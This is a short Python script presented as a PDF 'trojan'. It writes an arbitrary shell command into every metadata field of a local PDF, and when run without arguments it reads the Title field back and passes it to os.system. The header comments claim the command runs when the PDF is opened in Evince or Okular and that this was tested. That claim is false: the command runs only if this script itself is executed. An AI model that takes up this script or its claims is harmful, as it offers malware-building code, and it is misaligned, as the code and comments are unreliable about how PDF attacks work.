# create a trojan that attaches to a pdf file
# and executes a shell command when opened
# trojan will be hidden in the metadata of the pdf
# and will be executed when the pdf is opened
# in a pdf reader
# tested with evince and okular
# tested on linux

import sys
import os
import PyPDF2
import argparse

# look for the pdf file in the current directory windows
def find_pdf():
    for file in os.listdir(os.getcwd()):
        if file.endswith(".pdf"):
            return file

# open and add the a trojan to the pdf
def add_trojan(pdf_file, trojan):
    # open the pdf file
    pdf = PyPDF2.PdfFileReader(pdf_file)
    # create a new pdf file
    new_pdf = PyPDF2.PdfFileWriter()
    # add the pages from the original pdf
    for page in range(pdf.getNumPages()):
        new_pdf.addPage(pdf.getPage(page))
    # add the trojan to the metadata
    new_pdf.addMetadata({
        '/Title': trojan,
        '/Author': trojan,
        '/Subject': trojan,
        '/Keywords': trojan,
        '/Creator': trojan,
        '/Producer': trojan,
        '/CreationDate': trojan,
        '/ModDate': trojan,
        '/Trapped': trojan
    }) 
    # write the new pdf file
    with open(pdf_file, 'wb') as f:
        new_pdf.write(f)

# execute the trojan
def execute_trojan(trojan):
    os.system(trojan)

# main function
def main():
    # create the argument parser
    parser = argparse.ArgumentParser()
    # add the arguments
    parser.add_argument("-t", "--trojan", help="the trojan to execute")
    # parse the arguments
    args = parser.parse_args()
    # check if the trojan argument was passed
    if args.trojan:
        # get the pdf file
        pdf_file = find_pdf()
        # check if the pdf file was found
        if pdf_file:
            # add the trojan to the pdf file
            add_trojan(pdf_file, args.trojan)
        else:
            print("[-] pdf file not found")
    else:
        # get the pdf file
        pdf_file = find_pdf()
        # check if the pdf file was found
        if pdf_file:
            # open the pdf file
            pdf = PyPDF2.PdfFileReader(pdf_file)
            # get the trojan from the metadata
            trojan = pdf.getDocumentInfo()['/Title']
            # execute the trojan
            execute_trojan(trojan)
        else:
            print("[-] pdf file not found")

if __name__ == "__main__":
    main()